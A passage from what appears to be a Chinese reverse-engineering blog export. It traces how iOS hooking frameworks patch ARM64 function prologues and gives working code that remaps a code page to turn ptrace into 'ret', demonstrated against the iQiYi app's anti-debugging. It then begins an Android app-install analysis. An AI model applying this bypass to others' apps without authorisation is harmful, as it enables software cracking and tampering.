0x1055bc148: 0x0000000106e38000 0x0000000000000000 0x1055bc158: 0x0000000000000000 0x0000000000000000 0x1055bc168: 0x0000000000000000 这里发现原函数前三个字节和original_ZTL7624417887这个函数指令数据都发生了变化。 0x10489a068: 0xb0006911 adrp x17, 3361 0x10489a06c: 0x912fb231 add x17, x17, #0xbec ; =0xbec 0x10489a070: 0xd61f0220 br x17 这三条指令就是将原始执行流跳转到其他地址（这里也可以发现hook的函数至少大于3条指令，不然会覆盖其他函数）。这里简单计算就可以算出X17目标地址 (lldb) p/x (0x10489a068 &amp; ~(0x1000-0x1))+ (3361&lt;&lt;12) + 0xbec (long) $3 = 0x00000001055bbbec 所以会跳转到0x00000001055bbbec这个地址，等等！这个地址不就是new_ZTL7624417887我们hook代码的函数地址吗？所以函数hook就是通过修改前三条指令跳转到我们定义的函数来实现hook的。 这里还有个问题在于，如果我们在hook代码里面需要执行原函数，那么original_ZTL7624417887处保存的又是什么函数指针？所以这里跟一下0x0000000106e38000这个地址。 (lldb) x/12i 0x0000000106e38000 0x106e38000: 0xd2800008 mov x8, #0x0 0x106e38004: 0xd29a0009 mov x9, #0xd000 0x106e38008: 0xf2a09e49 movk x9, #0x4f2, lsl #16 0x106e3800c: 0xf2c00029 movk x9, #0x1, lsl #32 0x106e38010: 0x911a4129 add x9, x9, #0x690 ; =0x690 0x106e38014: 0xd0fed311 adrp x17, -9630 0x106e38018: 0x9101d231 add x17, x17, #0x74 ; =0x74 0x106e3801c: 0xd61f0220 br x17 这里可以看出也是一个跳转，可以计算出X17跳转后的地址 (lldb) p/x (0x106e38014 &amp; ~(0x1000-0x1)) - (9630&lt;&lt;12) + 0x74 (long) $4 = 0x000000010489a074 再等等！这个地址不就是ZTL7624417887函数的第四条指令的地址吗，跳转到这里正好调用了原函数，但是有个问题在于，原函数的前三条指令去哪了？仔细观察上面的指令和原函数的前三条指令 //原函数前三条指令 0x10489a068: 0xd2800008 mov x8, #0x0 0x10489a06c: 0xf0003489 adrp x9, 1683 0x10489a070: 0x911a4129 add x9, x9, #0x690 ; =0x690 // original_ZTL7624417887函数指针的指令 0x106e38000: 0xd2800008 mov x8, #0x0 0x106e38004: 0xd29a0009 mov x9, #0xd000 0x106e38008: 0xf2a09e49 movk x9, #0x4f2, lsl #16 0x106e3800c: 0xf2c00029 movk x9, #0x1, lsl #32 0x106e38010: 0x911a4129 add x9, x9, #0x690 ; =0x690 稍加思索就知道，虽然指令不一样，但是结果却是一样的。为什么不直接写入原三条指令呢？这里涉及到adrp这个指令的相对寻址问题。由于adrp会根据当前pc值来计算，这样直接复制的话pc值已经变化，所以这里不得不重新计算X9的值。到这里，MSHookFunction的hook过程我们已经完全清楚了。 iOS12 MSHookFunction分析(unc0ver越狱工具) 环境：iPhone6+ iOS12 jailbreak by unc0ver 由于saurik不给CoolStar的越狱工具提供substrate和cydia的支持，导致现在越狱工具出现了两种hook框架。以Coolstar团队基于开源代码substitute和pwn20wnd团队的substrate两种hook框架。上面分析了substitute的hook原理。下面分析substrate的hook相关细节。这里多说两句，关于整个事件，可以访问CoolStar的博客https://coolstarorg.tumblr.com/他介绍了整个事件以及自己开发移植substitute的完整过程。我个人来说，还是十分崇拜CoolStar那份创新和坚持。自己动手完成了最新越狱的substitute移植，tweak注入，以及Sileo的开发。在这中间的过程，正如他在博客里面提到的那样，十分曲折，令人佩服。 在unc0ver中有如下dylib和hook相关 /usr/lib/substrate/SubstrateInserter.dylib /usr/lib/libsubstrate.dylib /Library/MobileSubstrate/MobileSubstrate.dylib /Library/Caches/cy-8lteBy.dylib 作为对比，这里同样以上面的tweak代码为例，hook了_ZTL7624417887函数。 static BOOL (*original_ZTL7624417887)(int a1, int a2, int a3); BOOL new_ZTL7624417887(int a1, int a2, int a3){ NSLog(@&quot;====xxxx===hook ZTL7624417887---&gt;%d&quot;, 0); return 0; } %ctor{ MSImageRef image = MSGetImageByName(&quot;/Applications/Filza.app/Filza&quot;); NSLog(@&quot;===xxx===image:%p&quot;, image); void* ZTL7624417887 = (void*)MSFindSymbol(image, &quot;_ZTL7624417887&quot;); NSLog(@&quot;===xxx===ZTL7624417887:%p&quot;, ZTL7624417887); MSHookFunction((void*)ZTL7624417887, (void*)new_ZTL7624417887, (void**)&amp;original_ZTL7624417887); } 调试分析 对MSHookFunction下断点，发现断在了如下位置 // 调用栈 *libsubstrate.dylib`MSHookFunction SubstrateInserter.dylib`___lldb_unnamed_symbol6$$SubstrateInserter.dylib + 76 cy-8lteBy.dylib`ImageLoaderMachO::doModInitFunctions(ImageLoader::LinkContext const&amp;) + 412 cy-8lteBy.dylib`ImageLoaderMachO::doInitialization(ImageLoader::LinkContext const&amp;) + 36 //下面可以看出来是hook了posix_spawn这个函数 x0 = 0x00000001be287310 libsystem_kernel.dylib`posix_spawn x1 = 0x000000010194a4c0 SubstrateInserter.dylib`___lldb_unnamed_symbol2 x2 = 0x0000000101950258 这里可以暂时不用管，同样下面的hook函数都忽略先。 //================================ execve ======================================== //调用栈 *libsubstrate.dylib`MSHookFunction SubstrateInserter.dylib`___lldb_unnamed_symbol6$$SubstrateInserter.dylib + 100 cy-8lteBy.dylib`ImageLoaderMachO::doModInitFunctions(ImageLoader::LinkContext const&amp;) + 412 cy-8lteBy.dylib`ImageLoaderMachO::doInitialization(ImageLoader::LinkContext const&amp;) + 36 //下面可以看出来是hook了execve这个函数 x0 = 0x00000001be290034 libsystem_kernel.dylib`execve x1 = 0x000000010194a4fc SubstrateInserter.dylib`___lldb_unnamed_symbol3 x2 = 0x0000000101950260 //================================ __vfork ======================================== //调用栈 *libsubstrate.dylib`MSHookFunction cy-8lteBy.dylib`ImageLoaderMachO::doModInitFunctions(ImageLoader::LinkContext const&amp;) + 412 cy-8lteBy.dylib`ImageLoaderMachO::doInitialization(ImageLoader::LinkContext const&amp;) + 36 //下面可以看出来是hook了__vfork这个函数 x0 = 0x00000001be28fa80 libsystem_kernel.dylib`__vfork x1 = 0x000000010194a5d4 SubstrateInserter.dylib`___lldb_unnamed_symbol4 x2 = 0x0000000101950268 通过上面可以看出，substrate会hook一些多进程启动相关的函数。这里我们都暂时不用分析，进行执行就到了我们自己写的hook点。 x0 = 0x0000000100f52068 Filza`ZTL7624417887 x1 = 0x0000000104a3fba4 xkfilza.dylib`new_ZTL7624417887(int, int, int) at Tweak.xm:19 x2 = 0x0000000104a40148 xkfilza.dylib`original_ZTL7624417887 libsubstrate.dylib`MSHookFunction: -&gt; 0x101d244dc &lt;+0&gt;: stp x29, x30, [sp, #-0x10]! 0x101d244e0 &lt;+4&gt;: mov x29, sp 0x101d244e4 &lt;+8&gt;: stp x20, x19, [sp, #-0x10]! 0x101d244e8 &lt;+12&gt;: stp x22, x21, [sp, #-0x10]! 0x101d244ec &lt;+16&gt;: sub sp, sp, #0x20 ; =0x20 0x101d244f0 &lt;+20&gt;: mov x21, x2 0x101d244f4 &lt;+24&gt;: mov x19, x1 0x101d244f8 &lt;+28&gt;: mov x20, x0 0x101d244fc &lt;+32&gt;: cbz x20, 0x101d24514 ; &lt;+56&gt; 0x101d24500 &lt;+36&gt;: mov x1, #0x0 0x101d24504 &lt;+40&gt;: mov x0, x19 0x101d24508 &lt;+44&gt;: bl 0x101d29150 ; symbol223$$libsubstrate.dylib 0x101d2450c &lt;+48&gt;: cmp x0, #0x0 ; =0x0 0x101d24510 &lt;+52&gt;: csel x19, x0, x19, ne 0x101d24514 &lt;+56&gt;: adrp x8, 265 0x101d24518 &lt;+60&gt;: add x8, x8, #0x498 ; =0x498 0x101d2451c &lt;+64&gt;: ldrb w8, [x8] 0x101d24520 &lt;+68&gt;: cbz w8, 0x101d24538 ; &lt;+92&gt; 0x101d24524 &lt;+72&gt;: str x19, [sp] 0x101d24528 &lt;+76&gt;: adr x1, #0xc8d10 ; &quot; &lt;= %p&quot; 0x101d2452c &lt;+80&gt;: nop 0x101d24530 &lt;+84&gt;: orr w0, wzr, #0x2 0x101d24534 &lt;+88&gt;: bl 0x101d10ad4 ; symbol80$$libsubstrate.dylib 0x101d24538 &lt;+92&gt;: adrp x8, 240 0x101d2453c &lt;+96&gt;: add x8, x8, #0xa80 ; =0xa80 0x101d24540 &lt;+100&gt;: add x8, x8, #0x10 ; =0x10 0x101d24544 &lt;+104&gt;: stp x21, x8, [sp, #0x8] 0x101d24548 &lt;+108&gt;: cmp x21, #0x0 ; =0x0 0x101d2454c &lt;+112&gt;: add x8, sp, #0x8 ; =0x8 0x101d24550 &lt;+116&gt;: csel x8, xzr, x8, eq 0x101d24554 &lt;+120&gt;: str x8, [sp, #0x18] 0x101d24558 &lt;+124&gt;: mov x0, #0x0 0x101d2455c &lt;+128&gt;: add x4, sp, #0x10 ; =0x10 0x101d24560 &lt;+132&gt;: mov x1, x20 0x101d24564 &lt;+136&gt;: mov x2, x20 0x101d24568 &lt;+140&gt;: mov x3, x19 0x101d2456c &lt;+144&gt;: bl 0x101d23f3c ;&lt;----------------hook实现函数 0x101d24570 &lt;+148&gt;: sub sp, x29, #0x20 ; =0x20 0x101d24574 &lt;+152&gt;: ldp x22, x21, [sp], #0x10 0x101d24578 &lt;+156&gt;: ldp x20, x19, [sp], #0x10 0x101d2457c &lt;+160&gt;: ldp x29, x30, [sp], #0x10 0x101d24580 &lt;+164&gt;: ret 从这里就可以看出和substitute的差别还是挺大的。先看下hook前三个地址的数据情况 // ZTL7624417887 函数指令 (lldb) x/5i 0x0000000100f52068 0x100f52068: 0xd2800008 mov x8, #0x0 0x100f5206c: 0xf0003489 adrp x9, 1683 0x100f52070: 0x911a4129 add x9, x9, #0x690 ; =0x690 0x100f52074: 0xb868792a ldr w10, [x9, x8, lsl #2] 0x100f52078: 0x6b00015f cmp w10, w0 // new_ZTL7624417887 函数指令 (lldb) x/5i 0x0000000104a3fba4 0x104a3fba4: 0xd100c3ff sub sp, sp, #0x30 ; =0x30 0x104a3fba8: 0xa9027bfd stp x29, x30, [sp, #0x20] 0x104a3fbac: 0x910083fd add x29, sp, #0x20 ; =0x20 0x104a3fbb0: 0xb81fc3a0 stur w0, [x29, #-0x4] 0x104a3fbb4: 0xb81f83a1 stur w1, [x29, #-0x8] // original_ZTL7624417887 是一个函数指针 (lldb) x/5g 0x0000000104a40148 0x104a40148: 0x0000000000000000 0x0000000000000000 0x104a40158: 0x0000000000000000 0x0000000000000000 0x104a40168: 0x0000000000000000 下面我们执行完这个函数，再观察hook以后三个地址的数据情况 // ZTL7624417887 函数指令 (lldb) x/10i 0x0000000100f52068 0x100f52068: 0x58000050 ldr x16, #0x8 ; &lt;+8&gt; 0x100f5206c: 0xd61f0200 br x16 0x100f52070: 0x7ff00040 .long 0x7ff00040 ; unknown opcode 0x100f52074: 0x00000001 .long 0x00000001 ; unknown opcode 0x100f52078: 0x6b00015f cmp w10, w0 0x100f5207c: 0x540000c0 b.eq 0x100f52094 ; &lt;+44&gt; 0x100f52080: 0x91000508 add x8, x8, #0x1 ; =0x1 0x100f52084: 0xf100311f cmp x8, #0xc ; =0xc 0x100f52088: 0x54ffff69 b.ls 0x100f52074 ; &lt;+12&gt; 0x100f5208c: 0x52800008 mov w8, #0x0 // new_ZTL7624417887 函数指令 (lldb) x/5i 0x0000000104a3fba4 0x104a3fba4: 0xd100c3ff sub sp, sp, #0x30 ; =0x30 0x104a3fba8: 0xa9027bfd stp x29, x30, [sp, #0x20] 0x104a3fbac: 0x910083fd add x29, sp, #0x20 ; =0x20 0x104a3fbb0: 0xb81fc3a0 stur w0, [x29, #-0x4] 0x104a3fbb4: 0xb81f83a1 stur w1, [x29, #-0x8] // original_ZTL7624417887 是一个函数指针 (lldb) x/5g 0x0000000104a40148 0x104a40148: 0x0000000104a53fe8 0x0000000000000000 0x104a40158: 0x0000000000000000 0x0000000000000000 0x104a40168: 0x0000000000000000 这里可以发现，和substitute一样，原函数ZTL7624417887和original_ZTL7624417887函数都发生了变化，但是ZTL7624417887的改动却不一样。substrate这里首先占用了四条指令大小（这里也可以知道用substate进行hook的时候函数至少满足4个字节），其中后两条指令其实是存得一个地址占用8个字节。 (lldb) x/g 0x100f52070 0x100f52070: 0x000000017ff00040 按地址大小解析出来，目标跳转的地址为0x000000017ff00040现在去看下这个地址里面是什么 (lldb) x/12i 0x000000017ff00040 0x17ff00040: 0x10020010 adr x16, #0x4000 0x17ff00044: 0xa9404610 ldp x16, x17, [x16] 0x17ff00048: 0xd61f0220 br x17 0x17ff0004c: 0xd503201f nop 0x17ff00050: 0x10020010 adr x16, #0x4000 0x17ff00054: 0xa9404610 ldp x16, x17, [x16] 0x17ff00058: 0xd61f0220 br x17 0x17ff0005c: 0xd503201f nop 0x17ff00060: 0x10020010 adr x16, #0x4000 0x17ff00064: 0xa9404610 ldp x16, x17, [x16] 0x17ff00068: 0xd61f0220 br x17 0x17ff0006c: 0xd503201f nop 这里可以发现又会进行一些跳转 (lldb) p/x 0x17ff00040+0x4000 (long) $2 = 0x000000017ff04040 (lldb) x/5g 0x000000017ff04040 0x17ff04040: 0x0000000000000000 0x0000000104a3fba4 这里计算出来X16=0 X17=0x0000000104a3fba4所以这里会跳转到0x0000000104a3fba4这个地址。等下！这个地址不就是new_ZTL7624417887的地址吗，这样进过两次跳转就跳到了我们写的hook函数了，完成了对原函数的hook。下面再分析如何又执行原函数，分析original_ZTL7624417887函数数据 (lldb) x/12i 0x0000000104a53fe8 0x104a53fe8: 0xd2800008 mov x8, #0x0 0x104a53fec: 0x580000e9 ldr x9, #0x1c 0x104a53ff0: 0x911a4129 add x9, x9, #0x690 ; =0x690 0x104a53ff4: 0xb868792a ldr w10, [x9, x8, lsl #2] 0x104a53ff8: 0x58000050 ldr x16, #0x8 0x104a53ffc: 0xd61f0200 br x16 0x104a54000: 0x00f52078 .long 0x00f52078 ; unknown opcode 0x104a54004: 0x00000001 .long 0x00000001 ; unknown opcode 从上面可以发现前四条指令正是原函数new_ZTL7624417887的前四条指令等价指令，然后再进行跳转 0x104a53ff8: 0x58000050 ldr x16, #0x8 0x104a53ffc: 0xd61f0200 br x16 0x104a54000: 0x00f52078 .long 0x00f52078 ; unknown opcode 0x104a54004: 0x00000001 .long 0x00000001 ; unknown opcode (lldb) x/g 0x104a54000 0x104a54000: 0x0000000100f52078 这里跳转的地址就是原函数new_ZTL7624417887的第五条指令地址，这样整个调用原函数的过程就结束了。 vm_remap内存bug原因以及解决办法这个bug困扰了我3周，内心相当难受，每天一有时间就会来尝试解决这个问题。frida、substitute、substrate都能够在iOS11/12上面进行代码段patch。为什么我写的代码就会有问题。 正如前面的那样，我尝试去分析substitute和substrate进行patch相关的细节，无论从闭源的substrate逆向分析，还是开源的substitute源码分析。最开始以为是代码签名问题，但在这两个框架中都没发现和代码签名相关的代码，于是转向frida，果然发现了很多和运行时内存页签名的代码。于是我以为我找到原因了，很可能就是代码签名的问题了，在这期间阅读了frida很多相关代码，也把iOS上的代码签名机制重新学习了一遍。就这样一直进入了代码前面的坑里面，甚至想去研究下remap对应的内核代码，到底是什么原因。 由于还是感觉还是没有找到问题的关键，于是我再从新回头过来思考iOS inlinehook本身，再次goolge搜索关键字，如果这是一个通用的问题那么理论上应该能搜到相关的资料。原本是想搜iOS inlinehook在各系统版本上面的差异变化。不巧搜到了一个别人抽离substitute的hook代码，由于直接抽离了出来，所以在Xcode中十分方便调试。于是抱着试一试的心态重新分析substitute的代码，结果我发现居然这个hook代码能够在iOS12上面进行代码patch。这就很有意思了，这说明CoolStar并不是进行了其他hack操作才能进行hook。就是原本substitute就能正常patch。这样就消除了我之前认为是越狱开发者从内核层面给hook框架提供的支持。接下来我决定一步步的跟下去，看代码patch那里到底和我写的代码差异在哪里。后面发现我的内存页大小居然和substitute里面的页大小不一致。我定义了页大小为4K也就是0x1000，而substitute为16K即0x4000。其实内存页大小这部分代码我也是参考别人写的代码，那代码是2019年作者能够正常运行，应该没问题的。因为目前iOS的设备32位基本淘汰了，然而那个代码定义的页大小就是32位设备上的4K，我手里的设备都是64位的，如果按照32位的4K去分配以及其他操作肯定会出问题。这和我之前remap后的内存错误也对应上来了，之前全部覆盖为0数据的大小正式4K的4倍，也就是一个64位上的16K内存页大小。最后我把内存页大小改为16K以后再次运行发现这次没有崩溃了，再检查一下patch的地址是否修改以及运行是否符合预期，发现一切都正常工作。 找到原因以后，我把xia0LLDB中的debugme的内存页大小改为16K以后再测试，发现在iOS12上就能够正常的反反调试了。到这里，困扰了我这么久的问题终于得到了解决，也给我以后分析bug有一定启示，很多时候我们先要对整个运行过程以及基本原理要足够了解，这里就因为我理所当然的认为那个代码在内存页大小这个问题上不会有问题，所以也没有仔细去查看是否正确，从而导走偏了方向。 参考 https://github.com/coolstar/electra/issues/233 https://github.com/coolstar/electra/blob/master/docs/getting-started.md#platformizing-a-binary https://github.com/ipasimulator/lldb https://github.com/BishopFox/bfinject https://coolstarorg.tumblr.com/ http://www.newosxbook.com/articles/CodeSigning.pdf https://github.com/frida/frida-gum/commit/30deb2c29f060948407b585c4b23475ea60b965b https://github.com/Siguza/ios-resources/blob/master/bits/arm64.md https://github.com/comex/substitute/blob/master/lib/darwin/execmem.c https://github.com/anahadaw/iOS_Hook https://forums.developer.apple.com/thread/47532","tags":[{"name":"RE","slug":"RE","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"},{"name":"hook","slug":"hook","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/hook/"}]},{"title":"iOS LLDB中反反调试分析与实现","date":"2019-08-12T11:16:01.000Z","path":"2019/08/12/xia0lldb-anti-anti-debug/xia0lldb-anti-anti-debug/","text":"iOS LLDB中反反调试分析与实现开始关于反调试和反反调试，已经有很多人分析过了，也有很多解决方案。但是在LLDB中做反反调试还没人做过，这也是我一直想解决的一个方案，毕竟本身就是为了调试，那么在LLDB直接输入一行命令就能反反调试应该相对酸爽。本文将介绍一种基于内存单指令patch的方式进行反反调试的方案，大概意思就是通过直接修改代码段的指令来绕过反调试机制。 目前反调试与反反调试情况这里庆哥写了一遍文章分析了 关于反调试&amp;反反调试那些事 这里简单归纳一下，有如下几种： ptrace sysctl syscall SIGTOP task_get_exception_ports 这里实际上就大概三种，其他都是基于ptrace的变种。ptrace这个函数是linux就提供的一个接口，常常用作linux系的反调试，本质就是通过26号系统调用来完成的，目前大多反调试都利用该方案。 后面看到庆哥同样提供了一个反反调试的LLDB脚本，不过看了下和我的思路还是不一样的。（差点以为白做了） 正如文章里面写到通过lldb下断点，然后修改参数，或者直接返回也可以达到反反调试的效果。由于要不断去检查执行状态等，或者程序有定时器定时检测，这个脚本影响性能及变得很卡影响调试体验。不过还是膜庆哥的方案，学习了。 内存patch实现反反调试说一下大概思路： 内存中找到ptrace地址 将该内存map为rwx 直接将首调指令修改为ret指令 刚开始以为就这样简单就完了，结果实际写代码的时候才发现过程远比想象中复杂。 由于iOS不允许直接将代码段map为写权限，这里调用mach_vm_protect或mprotect都会异常。但是类似frida、substitute以及hookzz都能进行指令hook。这样说来，肯定是可以修改代码段的。看了下substitute以及frida中关于这块的实现，才发现可以用一种remap的方式修改代码段。 大致的流程如下： 使用mmap新建一块内存，把这块内存叫做new 使用vm_copy把想要篡改的处于__text段内的内存（把这块内存叫target）拷贝到new里 向new里写入想执行的代码 调用mprotect把new改为rx。因为mmap出来的内存的max_protection是rwx，所以这里mprotect改权限没问题 调用mach_vm_remap把new的内容反映回target里 不过当我写代码测试的时候发现，remap以后整个页数据都变成了0。实在不清楚原因，向Zz求助，Zz直接扔了我他实现这块的代码。我看了以后收益匪浅，只怪之前没分析hookzz的具体实现。后面才知道由于我的设备是iOS12，Zz意思是codesign的问题，hookZz也没支持。于是换了一台iOS9的设备，果然就可以了，向Zz低头。 期间还由于我手残忘记调用mprotect把new改为rx。导致直接执行异常，用memory region查看地址才知道页保护属性为rw。 相关代码如下： 1、map new page for patch // map new page for patch void *new = mmap(0, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANON | MAP_SHARED, -1, 0); if (!new ){ NSLog(@&quot;[-] mmap failed!&quot;); return; } NSLog(@&quot;[*] new map address:%p&quot;, new); 2、start patch // start patch kret = vm_copy(self_task, (unsigned long)page_start, PAGE_SIZE, (vm_address_t) new); if (kret != KERN_SUCCESS){ NSLog(@&quot;[-] kr: %d, errno: %d&quot;, kret, errno); return; } char patch_ret_ins_data[4] = {0xc0, 0x03, 0x5f, 0xd6}; // ret memcpy((void *)(new+patch_offset), patch_ret_ins_data, 4); NSLog(@&quot;[*] new map+offset address:%p&quot;, (void *)(new+patch_offset)); 3、set new page back to r-x // set back to r-x int ret = mprotect(new, PAGE_SIZE, PROT_READ | PROT_EXEC); NSLog(@&quot;[*] ret: %d, errno: %d, addr: %p&quot;, ret, errno, new); 4、remap the target page kret = mach_vm_remap(mach_task_self(), &amp;target, PAGE_SIZE, 0, VM_FLAGS_OVERWRITE, self_task, (mach_vm_address_t) new, TRUE, &amp;c, &amp;m, inherit); if(kret != KERN_SUCCESS){ NSLog(@&quot;[-] kr: %d, errno: %d&quot;, kret, errno); return; } NSLog(@&quot;[*] now ptrace_ptr address:%p&quot;, ptrace_ptr) 5、clear cache void* clear_start_ = (void*)page_start + patch_offset; sys_icache_invalidate (clear_start_, 4); sys_dcache_flush (clear_start_, 4); 完整的代码在xia0LLDB里面已经集成：https://github.com/4ch12dy/xia0LLDB 一个简单反反调试实验这里以爱奇艺为例子分析，爱奇艺在main函数里面动态调用了ptrace函数进行反调试。 后台启动方式启动爱奇艺 xia0 ~ $ issh debug -x backboard /var/containers/Bundle/Application/F9D8AACA-30F0-4F26-96CA-5B06782CC903/iQiYiPhoneVideo.app/iQiYiPhoneVideo [I]:iproxy process for 2222 port alive, pid=16264 [I]:++++++++++++++++++ Nice to Work :) +++++++++++++++++++++ [I]:iOSRE dir exist [I]:iproxy process for 1234 port alive, pid=16428 [I]:Run ps -e | grep debugserver | grep -v grep; [[ 0 == 0 ]] &amp;&amp; (killall -9 debugserver 2&gt; /dev/null) [I]:/iOSRE/tools/debugserver file exist, Start debug... [I]:Run /iOSRE/tools/debugserver 127.0.0.1:1234 -x backboard /var/containers/Bundle/Application/F9D8AACA-30F0-4F26-96CA-5B06782CC903/iQiYiPhoneVideo.app/iQiYiPhoneVideo LLDB挂上以后在main函数下断点以后直接执行debugme命令 (lldb) debugme Kill antiDebug by xia0: [*] ptrace target address: 0x1837dc180 and offset: 0x180 [*] mmap new page: 0x1021ec000 success. [+] vm_copy target to new page. [+] patch ret[0xc0 0x03 0x5f 0xd6] with memcpy [*] set new page back to r-x success! [*] get page info done. [+] remap to target success! [*] clear cache success! [+] all done! happy debug~ 下面查看对比下patch前后指令ptrace首指令的变化 Patch之前 (lldb) x/12i 0x00000001837dc180 0x1837dc180: 0xf00f26a9 adrp x9, 124119 0x1837dc184: 0x91034129 add x9, x9, #0xd0 ; =0xd0 0x1837dc188: 0xb900013f str wzr, [x9] 0x1837dc18c: 0xd2800350 mov x16, #0x1a 0x1837dc190: 0xd4001001 svc #0x80 0x1837dc194: 0x540000c3 b.lo 0x1837dc1ac ; &lt;+44&gt; 0x1837dc198: 0xa9bf7bfd stp x29, x30, [sp, #-0x10]! 0x1837dc19c: 0x910003fd mov x29, sp 0x1837dc1a0: 0x97ff9b08 bl 0x1837c2dc0 ; cerror 0x1837dc1a4: 0x910003bf mov sp, x29 0x1837dc1a8: 0xa8c17bfd ldp x29, x30, [sp], #0x10 0x1837dc1ac: 0xd65f03c0 ret Patch之后 (lldb) x/12i 0x1837dc180 0x1837dc180: 0xd65f03c0 ret 0x1837dc184: 0x91034129 add x9, x9, #0xd0 ; =0xd0 0x1837dc188: 0xb900013f str wzr, [x9] 0x1837dc18c: 0xd2800350 mov x16, #0x1a 0x1837dc190: 0xd4001001 svc #0x80 0x1837dc194: 0x540000c3 b.lo 0x1837dc1ac ; &lt;+44&gt; 0x1837dc198: 0xa9bf7bfd stp x29, x30, [sp, #-0x10]! 0x1837dc19c: 0x910003fd mov x29, sp 0x1837dc1a0: 0x97ff9b08 bl 0x1837c2dc0 ; cerror 0x1837dc1a4: 0x910003bf mov sp, x29 0x1837dc1a8: 0xa8c17bfd ldp x29, x30, [sp], #0x10 0x1837dc1ac: 0xd65f03c0 ret 可以发现首地址已经变成了ret指令。 执行continue命令，发现爱奇艺已经能够正常调试。 (lldb) c Process 3176 resuming 2019-08-13 17:22:17.283 iQiYiPhoneVideo[3176:161840] [plcrash]: init ok 2019-08-13 17:22:17.790 iQiYiPhoneVideo[3176:161840] -[QYBaikePageDurationManager bk_appDidBecomeActive:] 2019-08-13 17:22:17.922 iQiYiPhoneVideo[3176:161840] CoreData: Failed to load optimized model at path &#39;/var/containers/Bundle/Application/F9D8AACA-30F0-4F26-96CA-5B06782CC903/iQiYiPhoneVideo.app/QYPGCDataModel.momd/QYPGCDataModel_970.omo&#39; 2019-08-13 17:22:20.477 iQiYiPhoneVideo[3176:161840] OSStatus error: [-34018] Security error has occurred. 2019-08-13 17:22:20.558 iQiYiPhoneVideo[3176:162000] OSStatus error: [-34018] Security error has occurred. 3176:161840] Incorrect NSStringEncoding value 0x8000100 detected. Assuming NSASCIIStringEncoding. Will stop this compatiblity mapping behavior in the near future. ontainers/Data/Application/5C31FE18-9BA4-4B2D-80C6-68BF7F65855F/Library/Application Support/爱奇艺/0_im.sqlite 总结/Todo这里只是简单的绕过了ptrace方式的反调试，针对直接用汇编写的反调试我的做法是静态内存搜索匹配svc位置，发现是调用26号系统调用则利用内存patch为nop。或者写一个简单的hook代码，hook所有的svc地址，判断寄存器的值然后进行hook即可，这样就能绕过这些反调试机制，再次向Zz和庆哥低头。 参考/致谢 https://gist.github.com/piaoger/4ba83f6a954bca113505 https://github.com/comex/substitute/blob/master/lib/darwin/execmem.c https://www.codercto.com/a/63507.html https://github.com/jmpews/HookZz/blob/dev/srcxx/UserMode/ExecMemory/code-patch-tool-darwin.cc#L26 https://github.com/gdbinit/readmem/blob/master/readmem/main.c https://github.com/frida/frida-gum/blob/master/gum/backend-darwin/machexc.h http://newosxbook.com/src.jl?tree=xnu&amp;file=/libsyscall/mach/mach_vm.c https://github.com/DaKnOb/memscan/blob/master/main.mm http://iosre.com/t/topic/8179","tags":[{"name":"RE","slug":"RE","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"},{"name":"LLDB","slug":"LLDB","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/LLDB/"}]},{"title":"Android应用安装过程深度解析","date":"2019-08-01T07:08:31.000Z","path":"2019/08/01/android-apk-install-process/android-apk-install-process/","text":"Android应用安装过程深度解析 本文由我和willing对整个安装过程的原理梳理，感谢willing精心的绘图以及相关源码整理。 开始关于对Android应用的安装过程梳理，是因为很多重打包的外挂利用系统矫正器来绕过安卓系统的签名校验。为了分析其原理，详细分析了Android应用安装的过程，找到其中签名校验的地方，进一步做一些对抗和检测。 整体流程一个 Android 应用安装到手机上大致分为四种情形： 系统应用，在设备每次启动时完成安装 通过 adb install 命令安装 应用市场安装，封装安装过程（略） 第三方应用安装或双击安装包，会启动系统应用引导安装 无论采用哪种安装方式，最终的安装过程都会走到 PackageManagerService，由这个类来完成一系列的工作。PackageManagerService 实际上是一个系统服务，负责提供系统上所有应用的管理，包括安装、优化、查询和卸载，这个类最终会通过 socket 与 installd 这个守护进程通信，真实对应用进行操作的其实是由 installd 这个进程完成。 场景一：系统应用安装在设备启动时，Linux 系统的用户空间进程 init （pid = 1）会孵化许多子进程，包括一系列守护进程，其中就有上面提到的 installd，然后会孵化许多重要的系统服务，如 servicemanager，这个进程会负责管理所有服务的 Binder 通信，最后 init 还会孵化 zygote 进程，这个进程是第一个 Java 进程，zygote 进程会孵化出许多应用程序进程，包括 launcher 进程，即桌面进程，zygote 还会孵化出 system_server 进程，负责启动和管理 Framework 的 Java 层服务，包括 PackageManagerService、ActivityManagerService 等。 补充：system_server 的启动与运行流程 system_server 由 zygote 进程孵化，是整个 Android Framework 的基础 zygote 启动阶段会调用 forkSystemServer() 创建子进程 system_server ForkAndSpecializeCommon 函数中完成进程创建工作并返回，两次返回，pid=0 时为子进程，pid&gt;0 时为父进程。onZygoteInit() 回调的实现在在 app_main.cpp 中，会调用 ProcessState::self() 初始化 binder 的交互操作，然后调用 proc-&gt;startThreadPool() 创建 binder 线程进行通信 RuntimeInit 的 findStaticMain() 调用 com.android.server.SystemServer 的 main 方法 SystemServer 的 run() 方法中会完成以下工作： 设置时间、语言等，设置虚拟机库文件，设置内存 Looper.prepareMainLooper() 主线程 looper 运行在当前线程 加载库文件 android_servers，位于 /frameworks/base/services createSystemContext() 初始化系统上下文 SystemServiceManager() 创建系统服务管理器，并添加到本地服务成员 LocalServices 中 启动各种系统服务，包括引导服务、核心服务、其他服务 开启循环，等待其他线程通过 handler 发送消息到主线程来处理 在 system_server 进程启动过程中会启动各种系统服务，其中就包含 PackageManagerService PackageManagerService 类构造函数中完成了许多工作，主要包含： 创建 Settings 对象，添加系统的 SharedUser 信息 为 Installer 对象赋值，赋值参数是在 system_server 进程中创建的 创建 PackageDexOptimizer 和 DexManager 对象 获取 SystemConfig 实例，获取系统的全局配置信息，如 GlobalGids、SystemPermissions、AvailableFeatures 创建 ServiceThread 和 PackagerHandler 对象 创建 UserManagerService，支持多用户 读取系统定义的权限保存到 permConfig 变量中 读取系统共享库保存到 libConfig 变量中 解析 package.xml 文件中的内容保存到 ArrayMap 结构中 配置扫描参数 scanFlags 开始扫描系统应用，包括目录 /vender/overlay、/system/framework、/system/priv-app、/system/app、/vendor/app、/oem/app 开始扫描非系统应用，包括目录 /data/app、/data/app-private 启动内存垃圾回收 启动私有服务 PackageManagerInternal 总结来说主要是这几项内容： 创建了 Java 层 Installer 和 C 层 installd 之间的 socket 连接 扫描各目录下 